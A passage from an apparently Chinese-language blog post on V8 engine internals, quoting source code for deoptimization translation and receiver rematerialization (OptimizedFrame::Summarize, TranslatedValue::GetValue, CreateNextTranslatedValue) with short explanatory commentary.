</span></span><span style="display:flex;"><span>    CachedStateValuesBuilder <span style="color:#a6e22e">cache_builder</span>(values, inputs, deduplicator);
</span></span><span style="display:flex;"><span>    StateValuesAccess<span style="color:#f92672">::</span>iterator it <span style="color:#f92672">=</span> StateValuesAccess(node).begin();
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Take advantage of sparse nature of StateValuesAccess to skip over
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// multiple empty nodes at once pushing repeated OptimizedOuts all in one
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// go.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>it.done()) {
</span></span><span style="display:flex;"><span>      values<span style="color:#f92672">-&gt;</span>PushOptimizedOut(it.AdvanceTillNotEmpty());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (it.done()) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      StateValuesAccess<span style="color:#f92672">::</span>TypedNode input_node <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>it;
</span></span><span style="display:flex;"><span>      entries <span style="color:#f92672">+=</span> AddOperandToStateValueDescriptor(values, inputs, g,
</span></span><span style="display:flex;"><span>                                                  deduplicator, input_node.node,
</span></span><span style="display:flex;"><span>                                                  input_node.type, kind, zone);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">++</span>it;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (cache_builder.CanCache()) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Use this-&gt;zone() to build the cache entry in the instruction selector&#39;s
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// zone rather than the more long-lived instruction zone.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      state_values_cache_.emplace(key, cache_builder.Build(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>zone()));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> entries;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>可以看到追溯到了 FrameState 节点，VisitiDeoptimize 函数把 FrameStatme 节点中的信息，分成了 Descriptor 和 Operands 两部分。</p>
<p>这样 receiver 的信息就从 FrameState 传递到了编译后生成的代码中，最终在 <code>OptimizedFrame::Summarize</code> 函数中读取出来，用来重新创建 Receiver。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> OptimizedFrame<span style="color:#f92672">::</span>Summarize(std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>FrameSummary<span style="color:#f92672">&gt;*</span> frames) <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>  DCHECK(frames<span style="color:#f92672">-&gt;</span>empty());
</span></span><span style="display:flex;"><span>  DCHECK(is_optimized());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Delegate to JS frame in absence of turbofan deoptimization.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// TODO(turbofan): Revisit once we support deoptimization across the board.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  Code code <span style="color:#f92672">=</span> LookupCode();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (code.kind() <span style="color:#f92672">==</span> CodeKind<span style="color:#f92672">::</span>BUILTIN) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> JavaScriptFrame<span style="color:#f92672">::</span>Summarize(frames);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> deopt_index <span style="color:#f92672">=</span> SafepointEntry<span style="color:#f92672">::</span>kNoDeoptIndex;
</span></span><span style="display:flex;"><span>  DeoptimizationData <span style="color:#66d9ef">const</span> data <span style="color:#f92672">=</span> GetDeoptimizationData(<span style="color:#f92672">&amp;</span>deopt_index);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (deopt_index <span style="color:#f92672">==</span> SafepointEntry<span style="color:#f92672">::</span>kNoDeoptIndex) {
</span></span><span style="display:flex;"><span>    CHECK(data.is_null());
</span></span><span style="display:flex;"><span>    FATAL(<span style="color:#e6db74">&#34;Missing deoptimization information for OptimizedFrame::Summarize.&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Prepare iteration over translation. Note that the below iteration might
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// materialize objects without storing them back to the Isolate, this will
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// lead to objects being re-materialized again for each summary.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  TranslatedState <span style="color:#a6e22e">translated</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>  translated.Prepare(fp());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// We create the summary in reverse order because the frames
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// in the deoptimization translation are ordered bottom-to-top.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">bool</span> is_constructor <span style="color:#f92672">=</span> IsConstructor();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span> it <span style="color:#f92672">=</span> translated.begin(); it <span style="color:#f92672">!=</span> translated.end(); it<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span> TranslatedFrame<span style="color:#f92672">::</span>kUnoptimizedFunction <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span> TranslatedFrame<span style="color:#f92672">::</span>kJavaScriptBuiltinContinuation <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>            TranslatedFrame<span style="color:#f92672">::</span>kJavaScriptBuiltinContinuationWithCatch) {
</span></span><span style="display:flex;"><span>      Handle<span style="color:#f92672">&lt;</span>SharedFunctionInfo<span style="color:#f92672">&gt;</span> shared_info <span style="color:#f92672">=</span> it<span style="color:#f92672">-&gt;</span>shared_info();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// The translation commands are ordered and the function is always
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// at the first position, and the receiver is next.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      TranslatedFrame<span style="color:#f92672">::</span>iterator translated_values <span style="color:#f92672">=</span> it<span style="color:#f92672">-&gt;</span>begin();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Get or materialize the correct function in the optimized frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Handle<span style="color:#f92672">&lt;</span>JSFunction<span style="color:#f92672">&gt;</span> function <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          Handle<span style="color:#f92672">&lt;</span>JSFunction<span style="color:#f92672">&gt;::</span>cast(translated_values<span style="color:#f92672">-&gt;</span>GetValue());
</span></span><span style="display:flex;"><span>      translated_values<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Get or materialize the correct receiver in the optimized frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> receiver <span style="color:#f92672">=</span> translated_values<span style="color:#f92672">-&gt;</span>GetValue(); <span style="color:#75715e">// &lt;&lt; 这里读取 receier
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      translated_values<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Determine the underlying code object and the position within it from
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// the translation corresponding to the frame type in question.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Handle<span style="color:#f92672">&lt;</span>AbstractCode<span style="color:#f92672">&gt;</span> abstract_code;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">unsigned</span> code_offset;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span> TranslatedFrame<span style="color:#f92672">::</span>kJavaScriptBuiltinContinuation <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>          it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>              TranslatedFrame<span style="color:#f92672">::</span>kJavaScriptBuiltinContinuationWithCatch) {
</span></span><span style="display:flex;"><span>        code_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        abstract_code <span style="color:#f92672">=</span> ToAbstractCode(
</span></span><span style="display:flex;"><span>            isolate()<span style="color:#f92672">-&gt;</span>builtins()<span style="color:#f92672">-&gt;</span>code_handle(
</span></span><span style="display:flex;"><span>                Builtins<span style="color:#f92672">::</span>GetBuiltinFromBytecodeOffset(it<span style="color:#f92672">-&gt;</span>bytecode_offset())),
</span></span><span style="display:flex;"><span>            isolate());
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        DCHECK_EQ(it<span style="color:#f92672">-&gt;</span>kind(), TranslatedFrame<span style="color:#f92672">::</span>kUnoptimizedFunction);
</span></span><span style="display:flex;"><span>        code_offset <span style="color:#f92672">=</span> it<span style="color:#f92672">-&gt;</span>bytecode_offset().ToInt();
</span></span><span style="display:flex;"><span>        abstract_code <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>            handle(shared_info<span style="color:#f92672">-&gt;</span>abstract_code(isolate()), isolate());
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Append full summary of the encountered JS frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;</span> params <span style="color:#f92672">=</span> GetParameters();
</span></span><span style="display:flex;"><span>      FrameSummary<span style="color:#f92672">::</span>JavaScriptFrameSummary summary(
</span></span><span style="display:flex;"><span>          isolate(), <span style="color:#f92672">*</span>receiver, <span style="color:#f92672">*</span>function, <span style="color:#f92672">*</span>abstract_code, code_offset,
</span></span><span style="display:flex;"><span>          is_constructor, <span style="color:#f92672">*</span>params);
</span></span><span style="display:flex;"><span>      frames<span style="color:#f92672">-&gt;</span>push_back(summary);
</span></span><span style="display:flex;"><span>      is_constructor <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span> TranslatedFrame<span style="color:#f92672">::</span>kConstructStub) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// The next encountered JS frame will be marked as a constructor call.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      DCHECK(<span style="color:#f92672">!</span>is_constructor);
</span></span><span style="display:flex;"><span>      is_constructor <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span>Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> TranslatedValue<span style="color:#f92672">::</span>GetValue() {
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> value(GetRawValue(), isolate());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (materialization_state() <span style="color:#f92672">==</span> kFinished) <span style="color:#66d9ef">return</span> value;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (value<span style="color:#f92672">-&gt;</span>IsSmi()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Even though stored as a Smi, this number might instead be needed as a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// HeapNumber when materializing a JSObject with a field of HeapObject
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// representation. Since we don&#39;t have this information available here, we
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// just always allocate a HeapNumber and later extract the Smi again if we
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// don&#39;t need a HeapObject.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    set_initialized_storage(
</span></span><span style="display:flex;"><span>        isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewHeapNumber(value<span style="color:#f92672">-&gt;</span>Number()));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> value;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>value <span style="color:#f92672">!=</span> ReadOnlyRoots(isolate()).arguments_marker()) {
</span></span><span style="display:flex;"><span>    set_initialized_storage(Handle<span style="color:#f92672">&lt;</span>HeapObject<span style="color:#f92672">&gt;::</span>cast(value));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> storage_;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Otherwise we have to materialize.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (kind() <span style="color:#f92672">==</span> TranslatedValue<span style="color:#f92672">::</span>kCapturedObject <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>      kind() <span style="color:#f92672">==</span> TranslatedValue<span style="color:#f92672">::</span>kDuplicatedObject) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// We need to materialize the object (or possibly even object graphs).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// To make the object verifier happy, we materialize in two steps.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 1. Allocate storage for reachable objects. This makes sure that for
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    each object we have allocated space on heap. The space will be
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    a byte array that will be later initialized, or a fully
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    initialized object if it is safe to allocate one that will
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    pass the verifier.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    container_<span style="color:#f92672">-&gt;</span>EnsureObjectAllocatedAt(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Finish any sweeping so that it becomes safe to overwrite the ByteArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// headers.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// TODO(hpayer): Find a cleaner way to support a group of
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// non-fully-initialized objects.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    isolate()<span style="color:#f92672">-&gt;</span>heap()<span style="color:#f92672">-&gt;</span>mark_compact_collector()<span style="color:#f92672">-&gt;</span>EnsureSweepingCompleted();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 2. Initialize the objects. If we have allocated only byte arrays
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    for some objects, we now overwrite the byte arrays with the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    correct object fields. Note that this phase does not allocate
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    any new objects, so it does not trigger the object verifier.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> container_<span style="color:#f92672">-&gt;</span>InitializeObjectAt(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">double</span> number <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>HeapObject<span style="color:#f92672">&gt;</span> heap_object;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (kind()) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslatedValue<span style="color:#f92672">::</span>kInt32:
</span></span><span style="display:flex;"><span>      number <span style="color:#f92672">=</span> int32_value();
</span></span><span style="display:flex;"><span>      heap_object <span style="color:#f92672">=</span> isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewHeapNumber(number);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslatedValue<span style="color:#f92672">::</span>kInt64:
</span></span><span style="display:flex;"><span>      number <span style="color:#f92672">=</span> int64_value();
</span></span><span style="display:flex;"><span>      heap_object <span style="color:#f92672">=</span> isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewHeapNumber(number);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslatedValue<span style="color:#f92672">::</span>kInt64ToBigInt:
</span></span><span style="display:flex;"><span>      heap_object <span style="color:#f92672">=</span> BigInt<span style="color:#f92672">::</span>FromInt64(isolate(), int64_value());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslatedValue<span style="color:#f92672">::</span>kUInt32:
</span></span><span style="display:flex;"><span>      number <span style="color:#f92672">=</span> uint32_value();
</span></span><span style="display:flex;"><span>      heap_object <span style="color:#f92672">=</span> isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewHeapNumber(number);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslatedValue<span style="color:#f92672">::</span>kFloat:
</span></span><span style="display:flex;"><span>      number <span style="color:#f92672">=</span> float_value().get_scalar();
</span></span><span style="display:flex;"><span>      heap_object <span style="color:#f92672">=</span> isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewHeapNumber(number);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslatedValue<span style="color:#f92672">::</span>kDouble:
</span></span><span style="display:flex;"><span>      number <span style="color:#f92672">=</span> double_value().get_scalar();
</span></span><span style="display:flex;"><span>      heap_object <span style="color:#f92672">=</span> isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewHeapNumber(number);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      UNREACHABLE();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  DCHECK(<span style="color:#f92672">!</span>IsSmiDouble(number) <span style="color:#f92672">||</span> kind() <span style="color:#f92672">==</span> TranslatedValue<span style="color:#f92672">::</span>kInt64ToBigInt);
</span></span><span style="display:flex;"><span>  set_initialized_storage(heap_object);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> storage_;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span><span style="color:#75715e">// We can&#39;t intermix stack decoding and allocations because the deoptimization
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// infrastracture is not GC safe.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Thus we build a temporary structure in malloced space.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// The TranslatedValue objects created correspond to the static translation
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// instructions from the TranslationArrayIterator, except for
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// TranslationOpcode::ARGUMENTS_ELEMENTS, where the number and values of the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// FixedArray elements depend on dynamic information from the optimized frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Returns the number of expected nested translations from the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// TranslationArrayIterator.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> TranslatedState<span style="color:#f92672">::</span>CreateNextTranslatedValue(
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> frame_index, TranslationArrayIterator<span style="color:#f92672">*</span> iterator,
</span></span><span style="display:flex;"><span>    DeoptimizationLiteralArray literal_array, Address fp,
</span></span><span style="display:flex;"><span>    RegisterValues<span style="color:#f92672">*</span> registers, FILE<span style="color:#f92672">*</span> trace_file) {
</span></span><span style="display:flex;"><span>  disasm<span style="color:#f92672">::</span>NameConverter converter;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  TranslatedFrame<span style="color:#f92672">&amp;</span> frame <span style="color:#f92672">=</span> frames_[frame_index];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> value_index <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(frame.values_.size());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  TranslationOpcode opcode <span style="color:#f92672">=</span> TranslationOpcodeFromInt(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (opcode) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>BEGIN:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>INTERPRETED_FRAME:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>ARGUMENTS_ADAPTOR_FRAME:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>CONSTRUCT_STUB_FRAME:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>JAVA_SCRIPT_BUILTIN_CONTINUATION_WITH_CATCH_FRAME:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>BUILTIN_CONTINUATION_FRAME:
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>JS_TO_WASM_BUILTIN_CONTINUATION_FRAME:
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif  </span><span style="color:#75715e">// V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>UPDATE_FEEDBACK:
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Peeled off before getting here.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>DUPLICATED_OBJECT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> object_id <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;duplicated object #%d&#34;</span>, object_id);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      object_positions_.push_back(object_positions_[object_id]);
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewDuplicateObject(<span style="color:#66d9ef">this</span>, object_id);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>ARGUMENTS_ELEMENTS: {
</span></span><span style="display:flex;"><span>      CreateArgumentsType arguments_type <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>CreateArgumentsType<span style="color:#f92672">&gt;</span>(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>      CreateArgumentsElementsTranslatedValues(frame_index, fp, arguments_type,
</span></span><span style="display:flex;"><span>                                              trace_file);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>ARGUMENTS_LENGTH: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;arguments length field (length = %d)&#34;</span>,
</span></span><span style="display:flex;"><span>               actual_argument_count_);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      frame.Add(TranslatedValue<span style="color:#f92672">::</span>NewInt32(<span style="color:#66d9ef">this</span>, actual_argument_count_));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>CAPTURED_OBJECT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> field_count <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> object_index <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(object_positions_.size());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;captured object #%d (length = %d)&#34;</span>, object_index,
</span></span><span style="display:flex;"><span>               field_count);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      object_positions_.push_back({frame_index, value_index});
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
